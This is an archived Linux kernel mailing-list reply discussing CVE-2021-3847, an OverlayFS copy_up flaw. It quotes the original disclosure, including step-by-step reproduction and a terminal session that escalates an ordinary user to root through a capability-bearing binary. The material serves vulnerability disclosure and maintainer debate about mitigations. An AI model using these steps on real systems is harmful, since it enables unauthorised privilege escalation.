Return-Path: <linux-unionfs-owner@vger.kernel.org>
X-Original-To: lists+linux-unionfs@lfdr.de
Delivered-To: lists+linux-unionfs@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 0A00A433C62
	for <lists+linux-unionfs@lfdr.de>; Tue, 19 Oct 2021 18:35:13 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231526AbhJSQhY (ORCPT <rfc822;lists+linux-unionfs@lfdr.de>);
        Tue, 19 Oct 2021 12:37:24 -0400
Received: from smtp-relay-canonical-0.canonical.com ([185.125.188.120]:41200
        "EHLO smtp-relay-canonical-0.canonical.com" rhost-flags-OK-OK-OK-OK)
        by vger.kernel.org with ESMTP id S229991AbhJSQhY (ORCPT
        <rfc822;linux-unionfs@vger.kernel.org>);
        Tue, 19 Oct 2021 12:37:24 -0400
Received: from mussarela (201-68-25-184.dsl.telesp.net.br [201.68.25.184])
        (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
         key-exchange ECDHE (P-256) server-signature RSA-PSS (2048 bits) server-digest SHA256)
        (No client certificate requested)
        by smtp-relay-canonical-0.canonical.com (Postfix) with ESMTPSA id 42EAC3FFF5;
        Tue, 19 Oct 2021 16:35:08 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
        s=20210705; t=1634661310;
        bh=1/lvLIQGuFwzjT7eBx45Cfasvc9iD6/rvhVRK8x9HKI=;
        h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
         Content-Type:In-Reply-To;
        b=SGLGvI2F1+Q1Y8VRHdIhV2VDCHqquN1azpbD17W35DN9RTGKs65fDJWZRBWlYqHys
         1/yjcpWXjMs7GkvcZ7Cd+dsOd8WAqVPLjT36kyI/rYyxOwR0HzreSMVE2pGCWawP3N
         Pk+zCrLlamPMkLQncI/+LDkitvF1soYWKL19pn9xjpdP4l9wfbh4jlXmzMNSb5+uaM
         14BOMqxmDk+TyMoYTyc1KI6afPFAmcEYsivFwjYD5pLXqhyaXvSa6FttxQipTKmcBY
         w5qW6bBxiTBA4FOebEvWVuD5fvaVOdHZUhOJnaHgGl2/3MAClwpImHb5lxeemG9NOh
         keClqYutdDBtQ==
Date:   Tue, 19 Oct 2021 13:35:04 -0300
From:   Thadeu Lima de Souza Cascardo <cascardo@canonical.com>
To:     Miklos Szeredi <miklos@szeredi.hu>
Cc:     oss-security@lists.openwall.com, linux-fsdevel@vger.kernel.org,
        linux-unionfs@vger.kernel.org,
        Alon Zahavi <Alon.Zahavi@cyberark.com>,
        Vegard Nossum <vegard.nossum@oracle.com>,
        Nir Chako <Nir.Chako@cyberark.com>,
        Alon Zahavi <zahavi.alon@gmail.com>
Subject: Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege
 Escalation using overlays copy_up
Message-ID: <YW7zuLv8TYDNzyqC@mussarela>
References: <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM>
 <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
 <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
Precedence: bulk
List-ID: <linux-unionfs.vger.kernel.org>
X-Mailing-List: linux-unionfs@vger.kernel.org

On Tue, Oct 19, 2021 at 05:23:27PM +0200, Miklos Szeredi wrote:
> On Thu, Oct 14, 2021 at 06:30:53PM +0000, Alon Zahavi wrote:
> > 
> > After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
> > There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
> > This vulnerability was attached with CVE-2021-3847.
> > Here is the report that was initially sent:
> > 
> > ## Bug Class
> > Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
> > # Technical Details
> > ## Summary:
> > An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
> > ## In details:
> > If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
> 
> I think this is a misunderstanding about how overlayfs operates.  Mounting
> overlayfs is effectively a just-in-time version of "cp -a lowerdir upperdir".
> In other words if the admin creates an overlay where the lower layer is
> untrusted and the upper layer is trusted, then that act itself is the
> privilege escalation.
> 
> This is more formally documented in "Documentation/filesystems/overlayfs.rst"
> in the "Permission model" section.
> 
> If this model is not clear, then maybe it needs to be spelled out more
> explicitly.  Perhaps even a warning message could be added to the kernel logs
> in case the lower mount is "nosuid".  But IMO erroring out on the copy-up or
> skipping copy up of certain attributes would make the cure worse than the
> disease.

Should we fail (and log it) when the lower mount and upper mount have different
suid settings, and require a force option to be used?

Cascardo.

> 
> Let me know if I'm missing something.
> 
> Thanks,
> Miklos
> 
> > See attached image.
> > ## Build:
> > Any Linux machine with a support for overlayFS.
> > For example: AWS EC2 Ubuntu 20.04.
> > Mount a device to any folder.
> > Copy any file with capabilities into that folder.
> > Remount the device now with nosuid option.
> > mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
> > ## Execution:
> > As a low-priv user cd into the merged directory.
> > Execute touch capable_file
> > cd to the upper layer directory.
> > Execute the capable binary.
> > ## Expected Results:
> > When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
> > ## Observed Results:
> > The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
> > 
> > 
> > ########## Example ##########
> > # there are two mount in question
> > $ cd /home/user/overlayfs/
> > 
> > $ ls -l
> > drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
> > drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
> > drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
> > drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
> > drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
> > 
> > # there are two mount in question.
> > # lowerUSB is a mount of an USB, which has a capable file inside.
> > # IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
> > # The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
> > $ mount
> > /dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
> > overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
> > 
> > # The contents of all the directories.
> > $ ls -l *
> > lowerUSB:
> > total 40
> > -rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
> > drwx------ 2 user user 16384 Jul  5 14:07 lost+found
> > 
> > merge:
> > total 40
> > -rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
> > drwx------ 2 user user 16384 Jul  5 14:07 lost+found
> > 
> > test:
> > total 0
> > 
> > upper:
> > total 0
> > 
> > work:
> > total 4
> > d--------- 2 root root 4096 Sep 19 14:25 work
> > 
> > # escalate is an executable that set its uid and gid to 0.
> > $ getcap ./lowerUSB/escalate
> > ./lowerUSB/escalate = cap_setgid,cap_setuid+eip
> > 
> > $ id
> > uid=1000(user) gid=1000(user) groups=1000(user)
> > 
> > # When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
> > $ ./lowerUSB/escalate
> > [-] Failure
> > 
> > # Try to copy the binary with its capabilities.
> > # It should not work, because regular users are not allowed to copy the "security.capability" xattr.
> > $ cp --preserve=all ./lowerUSB/escalate ./test/escalate
> > cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
> > 
> > # Trigger the copy_up
> > $ touch ./merge/escalate
> > $ ls -l ./upper/
> > -rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
> > 
> > # The copy_up kept the binary capabilities (xattr)
> > $ getcap ./upper/escalate
> > ./upper/escalate = cap_setgid,cap_setuid+eip
> > 
> > # executing the binary, with the capabilities, so the privileges will escalate to root.
> > $ ./upper/escalate
> > $ id
> > uid=0(root) gid=0(root) groups=0(root)
> > 
> > 
